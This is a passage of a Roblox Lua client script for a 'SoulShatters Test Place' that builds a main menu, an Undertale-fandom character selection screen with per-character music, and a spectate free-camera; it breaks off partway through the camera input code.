for i,v in pairs(game.Players.LocalPlayer:WaitForChild("MenuPlaylist"):GetChildren()) do
v:Destroy()
end

local Sound = Instance.new("Sound")
Sound.Parent = game.Players.LocalPlayer.MenuPlaylist
Sound.Volume = 10
Sound.Playing = true
Sound.Looped = true
Sound.SoundId = "rbxassetid://5443675203"
Sound.Name = "Menu Song"

-- Gui to Lua
-- Version: 3.2

-- Instances:
 game.Players.LocalPlayer.PlayerGui.CharacterSelection.Enabled = false

local Menugui = Instance.new("ScreenGui")
local MenuBlack = Instance.new("Frame")
local MenuPng = Instance.new("ImageLabel")
local SS = Instance.new("TextLabel")
local Sig = Instance.new("TextLabel")
local e = Instance.new("Frame")
local e_2 = Instance.new("Frame")
local CustomButton = Instance.new("TextButton")
local CharacterButton = Instance.new("TextButton")
local SpectateButton = Instance.new("TextButton")

--Properties:

Menugui.Name = "Menugui"
Menugui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Menugui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MenuBlack.Name = "Menu Black"
MenuBlack.Parent = Menugui
MenuBlack.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MenuBlack.BorderColor3 = Color3.fromRGB(0,0,0)
MenuBlack.BorderSizePixel = 5
MenuBlack.Size = UDim2.new(0, 1139, 0, 146)

MenuPng.Name = "MenuPng"
MenuPng.Parent = MenuBlack
MenuPng.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MenuPng.Position = UDim2.new(-0.008779631, 0, 1.05660379, 0)
MenuPng.Size = UDim2.new(0, 1930, 0, 868)
MenuPng.Image = "http://www.roblox.com/asset/?id=1105135628"

SS.Name = "SS"
SS.Parent = MenuBlack
SS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SS.Position = UDim2.new(0.017559262, 0, 0.122641511, 0)
SS.Size = UDim2.new(0, 1033, 0, 78)
SS.Font = Enum.Font.SourceSansBold
SS.Text = "SoulShatters Test Place"
SS.TextColor3 = Color3.fromRGB(255, 255, 255)
SS.TextSize = 55.000
SS.BorderColor3 = Color3.fromRGB(0, 0, 0)

Sig.Parent = Menugui
Sig.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Sig.BackgroundTransparency = 1.000
Sig.Position = UDim2.new(0.386979163, 0, -0.00902708061, 0)
Sig.Rotation = 25.000
Sig.Size = UDim2.new(0, 200, 0, 50)
Sig.Font = Enum.Font.SourceSans
Sig.Text = "ALW Edition"
Sig.TextColor3 = Color3.fromRGB(255, 255, 255)
Sig.TextSize = 22.000

e.Name = "e"
e.Parent = Menugui
e.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
e.BorderColor3 = Color3.fromRGB(0, 0, 0)
e.BorderSizePixel = 5
e.Position = UDim2.new(0.586979151, 0, -0.0845824406, 0)
e.Rotation = 10.000
e.Size = UDim2.new(0, 915, 0, 264)

e_2.Name = "e"
e_2.Parent = Menugui
e_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
e_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
e_2.BorderSizePixel = 5
e_2.Position = UDim2.new(0, 0, 0.919700265, 0)
e_2.Size = UDim2.new(0, 1920, 0, 145)

CustomButton.Name = "CustomButton"
CustomButton.Parent = Menugui
CustomButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CustomButton.BackgroundTransparency = 1.000
CustomButton.Position = UDim2.new(0, 0, 0.827623129, 0)
CustomButton.Size = UDim2.new(0, 200, 0, 65)
CustomButton.Font = Enum.Font.SourceSansBold
CustomButton.Text = "Custom Characters"
CustomButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CustomButton.TextSize = 26.000

CharacterButton.Name = "CharacterButton"
CharacterButton.Parent = Menugui
CharacterButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CharacterButton.BackgroundTransparency = 1.000
CharacterButton.Position = UDim2.new(0.138541669, 0, 0.827623129, 0)
CharacterButton.Size = UDim2.new(0, 200, 0, 65)
CharacterButton.Font = Enum.Font.SourceSansBold
CharacterButton.Text = "Normal Characters"
CharacterButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CharacterButton.TextSize = 26.000

SpectateButton.Name = "SpectateButton"
SpectateButton.Parent = Menugui
SpectateButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpectateButton.BackgroundTransparency = 1.000
SpectateButton.Position = UDim2.new(0.322, 0,0.828, 0)
SpectateButton.Size = UDim2.new(0, 200, 0, 65)
SpectateButton.Font = Enum.Font.SourceSansBold
SpectateButton.Text = "Spectate"
SpectateButton.TextColor3 = Color3.fromRGB(0, 0, 0)
SpectateButton.TextSize = 26.000

CharacterButton.MouseButton1Up:Connect(function()
    game.Players.LocalPlayer.PlayerGui.CharacterSelection.Enabled = false
    
       MenuBlack:Destroy()
e:Destroy()
e_2:Destroy()
e:Destroy()
CharacterButton:Destroy()
CustomButton:Destroy()
CharacterButton:Destroy()
MenuPng:Destroy()
SpectateButton:Destroy()
Sig:Destroy()

for i,v in pairs(game.Players.LocalPlayer:WaitForChild("MenuPlaylist"):GetChildren()) do
v:Destroy()
end

local Sound = Instance.new("Sound")
Sound.Parent = game.Players.LocalPlayer.MenuPlaylist
Sound.Volume = 10
Sound.Playing = true
Sound.Looped = true
Sound.SoundId = "rbxassetid://398698299"
Sound.Name = "Menu Song"



local SSCharacters = Instance.new("ScreenGui")
local Line2 = Instance.new("Frame")
local Side = Instance.new("Frame")
local Middle = Instance.new("Frame")
local Line = Instance.new("Frame")
local OldSans = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local e = Instance.new("Frame")
local NewSans = Instance.new("TextButton")
local FriskUT = Instance.new("TextButton")
local AsrielDreemurr = Instance.new("TextButton")
local GTFrisk = Instance.new("TextButton")
local UT = Instance.new("TextLabel")
local GT = Instance.new("TextLabel")
local GTChara = Instance.new("TextButton")
local Betty = Instance.new("TextButton")
local Undyne = Instance.new("TextButton")
local StoryShift = Instance.new("TextLabel")
local CharaStory = Instance.new("TextButton")
local XTale = Instance.new("TextLabel")
local SansChara = Instance.new("TextButton")
local UltraSans = Instance.new("TextButton")



SSCharacters.Name = "SS Characters"
SSCharacters.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
SSCharacters.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Side.Name = "Side"
Side.Parent = SSCharacters
Side.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Side.BorderColor3 = Color3.fromRGB(255, 255, 255)
Side.BorderSizePixel = 5
Side.Position = UDim2.new(0.101562485, 0, -0.13169162, 0)
Side.Rotation = 10.000
Side.Size = UDim2.new(0, 152, 0, 1255)

Middle.Name = "Middle"
Middle.Parent = SSCharacters
Middle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Middle.BorderColor3 = Color3.fromRGB(0, 0, 0)
Middle.Position = UDim2.new(0, 0, -0.0588864982, 0)
Middle.Size = UDim2.new(0, 291, 0, 1134)

Line.Name = "Line"
Line.Parent = SSCharacters
Line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Line.Position = UDim2.new(0.151562497, 0, 0.785373271, 0)
Line.Size = UDim2.new(0, 7, 0, 148)

Line2.Name = "Line2"
Line2.Parent = SSCharacters
Line2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Line2.Position = UDim2.new(0.151562497, 0, 0.892695248, 0)
Line2.Size = UDim2.new(0, 7, 0, 204)

OldSans.Name = "OldSans"
OldSans.Parent = SSCharacters
OldSans.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
OldSans.BorderColor3 = Color3.fromRGB(255, 255, 255)
OldSans.Position = UDim2.new(0.00364583335, 0, 0.168094218, 0)
OldSans.Size = UDim2.new(0, 109, 0, 33)
OldSans.Font = Enum.Font.SourceSans
OldSans.Text = "Sans *OLD*"
OldSans.TextColor3 = Color3.fromRGB(0, 0, 0)
OldSans.TextSize = 14.000

Title.Name = "Title"
Title.Parent = SSCharacters
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title.Position = UDim2.new(0.0213541668, 0, 0.0182012841, 0)
Title.Size = UDim2.new(0, 312, 0, 50)
Title.Font = Enum.Font.SourceSansBold
Title.Text = "SoulShatters Characters"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 36.000

e.Name = "e"
e.Parent = SSCharacters
e.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
e.Position = UDim2.new(0.0145833334, 0, -0.215203419, 0)
e.Size = UDim2.new(0, 384, 0, 244)

NewSans.Name = "NewSans"
NewSans.Parent = SSCharacters
NewSans.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
NewSans.BorderColor3 = Color3.fromRGB(255, 255, 255)
NewSans.Position = UDim2.new(0.00364583335, 0, 0.243040681, 0)
NewSans.Size = UDim2.new(0, 109, 0, 33)
NewSans.Font = Enum.Font.SourceSans
NewSans.Text = "SansNEW"
NewSans.TextColor3 = Color3.fromRGB(0, 0, 0)
NewSans.TextSize = 14.000

FriskUT.Name = "FriskUT"
FriskUT.Parent = SSCharacters
FriskUT.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
FriskUT.BorderColor3 = Color3.fromRGB(255, 255, 255)
FriskUT.Position = UDim2.new(0.00364583335, 0, 0.316916466, 0)
FriskUT.Size = UDim2.new(0, 109, 0, 33)
FriskUT.Font = Enum.Font.SourceSans
FriskUT.Text = "FriskUT"
FriskUT.TextColor3 = Color3.fromRGB(0, 0, 0)
FriskUT.TextSize = 14.000

AsrielDreemurr.Name = "AsrielDreemurr"
AsrielDreemurr.Parent = SSCharacters
AsrielDreemurr.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
AsrielDreemurr.BorderColor3 = Color3.fromRGB(255, 255, 255)
AsrielDreemurr.Position = UDim2.new(0.00364583335, 0, 0.392933607, 0)
AsrielDreemurr.Size = UDim2.new(0, 109, 0, 33)
AsrielDreemurr.Font = Enum.Font.SourceSans
AsrielDreemurr.Text = "Asriel"
AsrielDreemurr.TextColor3 = Color3.fromRGB(0, 0, 0)
AsrielDreemurr.TextSize = 14.000

GTFrisk.Name = "GTFrisk"
GTFrisk.Parent = SSCharacters
GTFrisk.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
GTFrisk.BorderColor3 = Color3.fromRGB(255, 255, 255)
GTFrisk.Position = UDim2.new(0.00364583335, 0, 0.581370413, 0)
GTFrisk.Size = UDim2.new(0, 109, 0, 33)
GTFrisk.Font = Enum.Font.SourceSans
GTFrisk.Text = "FriskGT"
GTFrisk.TextColor3 = Color3.fromRGB(0, 0, 0)
GTFrisk.TextSize = 14.000

UT.Name = "UT"
UT.Parent = SSCharacters
UT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UT.BackgroundTransparency = 1.000
UT.Position = UDim2.new(-0.00468750019, 0, 0.0824411139, 0)
UT.Size = UDim2.new(0, 141, 0, 50)
UT.Font = Enum.Font.SourceSans
UT.Text = "Undertale"
UT.TextColor3 = Color3.fromRGB(255, 255, 255)
UT.TextSize = 32.000

GT.Name = "GT"
GT.Parent = SSCharacters
GT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GT.BackgroundTransparency = 1.000
GT.Position = UDim2.new(0, 0, 0.481798708, 0)
GT.Size = UDim2.new(0, 132, 0, 50)
GT.Font = Enum.Font.SourceSans
GT.Text = "GlitchTale"
GT.TextColor3 = Color3.fromRGB(255, 255, 255)
GT.TextSize = 32.000

GTChara.Name = "GTChara"
GTChara.Parent = SSCharacters
GTChara.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
GTChara.BorderColor3 = Color3.fromRGB(255, 255, 255)
GTChara.Position = UDim2.new(0.00364583335, 0, 0.659528852, 0)
GTChara.Size = UDim2.new(0, 109, 0, 33)
GTChara.Font = Enum.Font.SourceSans
GTChara.Text = "Chara"
GTChara.TextColor3 = Color3.fromRGB(0, 0, 0)
GTChara.TextSize = 14.000

Betty.Name = "Betty"
Betty.Parent = SSCharacters
Betty.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
Betty.BorderColor3 = Color3.fromRGB(255, 255, 255)
Betty.Position = UDim2.new(0.00364583335, 0, 0.740899324, 0)
Betty.Size = UDim2.new(0, 109, 0, 33)
Betty.Font = Enum.Font.SourceSans
Betty.Text = "BeteNoire"
Betty.TextColor3 = Color3.fromRGB(0, 0, 0)
Betty.TextSize = 14.000

Undyne.Name = "Undyne"
Undyne.Parent = SSCharacters
Undyne.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
Undyne.BorderColor3 = Color3.fromRGB(255, 255, 255)
Undyne.Position = UDim2.new(0.00364583335, 0, 0.823340416, 0)
Undyne.Size = UDim2.new(0, 109, 0, 33)
Undyne.Font = Enum.Font.SourceSans
Undyne.Text = "Undyne"
Undyne.TextColor3 = Color3.fromRGB(0, 0, 0)
Undyne.TextSize = 14.000

StoryShift.Name = "StoryShift"
StoryShift.Parent = SSCharacters
StoryShift.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StoryShift.BackgroundTransparency = 1.000
StoryShift.Position = UDim2.new(0.101041667, 0, 0.0824411139, 0)
StoryShift.Size = UDim2.new(0, 141, 0, 50)
StoryShift.Font = Enum.Font.SourceSans
StoryShift.Text = "StoryShift"
StoryShift.TextColor3 = Color3.fromRGB(255, 255, 255)
StoryShift.TextSize = 32.000

CharaStory.Name = "CharaStory"
CharaStory.Parent = SSCharacters
CharaStory.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
CharaStory.BorderColor3 = Color3.fromRGB(255, 255, 255)
CharaStory.Position = UDim2.new(0.112499997, 0, 0.168094218, 0)
CharaStory.Size = UDim2.new(0, 109, 0, 33)
CharaStory.Font = Enum.Font.SourceSans
CharaStory.Text = "CharaSS"
CharaStory.TextColor3 = Color3.fromRGB(0, 0, 0)
CharaStory.TextSize = 14.000

XTale.Name = "XTale"
XTale.Parent = SSCharacters
XTale.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
XTale.BackgroundTransparency = 1.000
XTale.Position = UDim2.new(0.104166664, 0, 0.290149897, 0)
XTale.Size = UDim2.new(0, 141, 0, 50)
XTale.Font = Enum.Font.SourceSans
XTale.Text = "XTale + UltraTale"
XTale.TextColor3 = Color3.fromRGB(255, 255, 255)
XTale.TextSize = 32.000

SansChara.Name = "Sans/Chara"
SansChara.Parent = SSCharacters
SansChara.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
SansChara.BorderColor3 = Color3.fromRGB(255, 255, 255)
SansChara.Position = UDim2.new(0.112499997, 0, 0.392933607, 0)
SansChara.Size = UDim2.new(0, 109, 0, 33)
SansChara.Font = Enum.Font.SourceSans
SansChara.Text = "Sans/Chara"
SansChara.TextColor3 = Color3.fromRGB(0, 0, 0)
SansChara.TextSize = 14.000

UltraSans.Name = "UltraSans"
UltraSans.Parent = SSCharacters
UltraSans.BackgroundColor3 = Color3.fromRGB(116, 0, 0)
UltraSans.BorderColor3 = Color3.fromRGB(255, 255, 255)
UltraSans.Position = UDim2.new(0.112499997, 0, 0.446466804, 0)
UltraSans.Size = UDim2.new(0, 109, 0, 33)
UltraSans.Font = Enum.Font.SourceSans
UltraSans.Text = "UltraSans"
UltraSans.TextColor3 = Color3.fromRGB(0, 0, 0)
UltraSans.TextSize = 14.000

OldSans.MouseButton1Up:Connect(function()
    game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "Sans"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    
    for i,v in pairs(game.Players.LocalPlayer:WaitForChild("StarterPlaylist"):GetChildren()) do
v:Destroy()
end

local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://3745550364"
music.Looped = true
music:Play()
    
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)

   NewSans.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "SansBadTime"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    
        for i,v in pairs(game.Players.LocalPlayer:WaitForChild("StarterPlaylist"):GetChildren()) do
v:Destroy()
end

local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://3745550364"
music.Looped = true
music:Play()
    
        e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)
FriskUT.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "Frisk"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
        for i,v in pairs(game.Players.LocalPlayer:WaitForChild("StarterPlaylist"):GetChildren()) do
v:Destroy()
end

local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://4477702275"
music.Looped = true
music:Play()
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)
AsrielDreemurr.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "Asriel"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://313566104"
music.Looped = true
music:Play()
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)
GTChara.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "Chara"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://7167345586"
music.Looped = true
music:Play()
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)
Undyne.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "Undyne"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
     local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://4820592509"
music.Looped = true
music:Play()
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)
Betty.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "Betty"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
     local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://1591067191"
music.Looped = true
music:Play()
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)
GTFrisk.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "GTFrisk"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
     local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://971019793"
music.Looped = true
music:Play()
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)
CharaStory.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "SFChara"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://2515916593"
music.Looped = true
music:Play()
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)
SansChara.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "XSans"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://5991924821"
music.Looped = true
music:Play()
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)
UltraSans.MouseButton1Up:Connect(function()
       game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "DeltaSans"
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 7
music.SoundId = "rbxassetid://5097232453"
music.Looped = true
music:Play()
    e:Destroy()
Title:Destroy()
OldSans:Destroy()
Line:Destroy()
Middle:Destroy()
Side:Destroy()
AsrielDreemurr:Destroy()
Undyne:Destroy()
GTFrisk:Destroy()
GTChara:Destroy()
Betty:Destroy()
SansChara:Destroy()
NewSans:Destroy()
FriskUT:Destroy()
CharaStory:Destroy()
UltraSans:Destroy()
UT:Destroy()
GT:Destroy()
XTale:Destroy()
StoryShift:Destroy()
end)

end)


SpectateButton.MouseButton1Up:Connect(function()
    
     game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    game.Players.LocalPlayer.PlayerGui.CharacterSelection.Enabled = false
    
       MenuBlack:Destroy()
e:Destroy()
e_2:Destroy()
e:Destroy()
CharacterButton:Destroy()
CustomButton:Destroy()
CharacterButton:Destroy()
MenuPng:Destroy()
SpectateButton:Destroy()
Sig:Destroy()
    
    for i,v in pairs(game.Players.LocalPlayer:WaitForChild("MenuPlaylist"):GetChildren()) do
v:Destroy()
end

local Sound = Instance.new("Sound")
Sound.Parent = game.Players.LocalPlayer.MenuPlaylist
Sound.Volume = 10
Sound.Playing = true
Sound.Looped = true
Sound.SoundId = "rbxassetid://5684454330"
Sound.Name = "Menu Song"
    
local ScreenGui = Instance.new("ScreenGui")
local PressToSpectate = Instance.new("TextLabel")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    PressToSpectate.Name = "FreeCam"
PressToSpectate.Parent = ScreenGui
PressToSpectate.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PressToSpectate.BackgroundTransparency = 1.000
PressToSpectate.Position = UDim2.new(0.0514134318, 0, 0.118358858, 0)
PressToSpectate.Size = UDim2.new(0, 200, 0, 50)
PressToSpectate.Font = Enum.Font.SourceSansBold
PressToSpectate.Text = "Shift + P to Spectate"
PressToSpectate.TextColor3 = Color3.fromRGB(255, 0, 0)
PressToSpectate.TextSize = 26.000

function sandbox(var,func)
local env = getfenv(func)
local newenv = setmetatable({},{
__index = function(self,k)
if k=="script" then
return var
else
return env[k]
end
end,
})
setfenv(func,newenv)
return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
LocalScript0 = Instance.new("LocalScript")
LocalScript0.Name = "FreeCamera"
LocalScript0.Parent = mas
table.insert(cors,sandbox(LocalScript0,function()

 
local pi    = math.pi
local abs   = math.abs
local clamp = math.clamp
local exp   = math.exp
local rad   = math.rad
local sign  = math.sign
local sqrt  = math.sqrt
local tan   = math.tan
 
local ContextActionService = game:GetService("ContextActionService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
 
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
LocalPlayer = Players.LocalPlayer
end
 
local Camera = workspace.CurrentCamera
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
local newCamera = workspace.CurrentCamera
if newCamera then
Camera = newCamera
end
end)
 
------------------------------------------------------------------------
 
local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
local FREECAM_MACRO_KB = {Enum.KeyCode.LeftShift, Enum.KeyCode.P}
 
local NAV_GAIN = Vector3.new(1, 1, 1)*64
local PAN_GAIN = Vector2.new(0.75, 1)*8
local FOV_GAIN = 300
 
local PITCH_LIMIT = rad(90)
 
local VEL_STIFFNESS = 1.5
local PAN_STIFFNESS = 1.0
local FOV_STIFFNESS = 4.0
 
------------------------------------------------------------------------
 
local Spring = {} do
Spring.__index = Spring
 
function Spring.new(freq, pos)
local self = setmetatable({}, Spring)
self.f = freq
self.p = pos
self.v = pos*0
return self
end
 
function Spring:Update(dt, goal)
local f = self.f*2*pi
local p0 = self.p
local v0 = self.v
 
local offset = goal - p0
local decay = exp(-f*dt)
 
local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
local v1 = (f*dt*(offset*f - v0) + v0)*decay
 
self.p = p1
self.v = v1
 
return p1
end
 
function Spring:Reset(pos)
self.p = pos
self.v = pos*0
end
end
 
------------------------------------------------------------------------
 
local cameraPos = Vector3.new()
local cameraRot = Vector2.new()
local cameraFov = 0
 
local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
local fovSpring = Spring.new(FOV_STIFFNESS, 0)
 
------------------------------------------------------------------------
 
local Input = {} do
local thumbstickCurve do
local K_CURVATURE = 2.0
local K_DEADZONE = 0.15
 
local function fCurve(x)
return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
end
 
local function fDeadzone(x)
return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
end
 
function thumbstickCurve(x)
return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
end
end
 
local gamepad = {
ButtonX = 0,
ButtonY = 0,
DPadDown = 0,
DPadUp = 0,
ButtonL2 = 0,
ButtonR2 = 0,
Thumbstick1 = Vector2.new(),
Thumbstick2 = Vector2.new(),
}
 
local keyboard = {
W = 0,
A = 0,
S = 0,
D = 0,
E = 0,
Q = 0,
U = 0,
H = 0,
J = 0,
K = 0,
I = 0,
Y = 0,
Up = 0,
Down = 0,
LeftShift = 0,
RightShift = 0,
}
 
local mouse = {
Delta = Vector2.new(),
MouseWheel = 0,
}
 
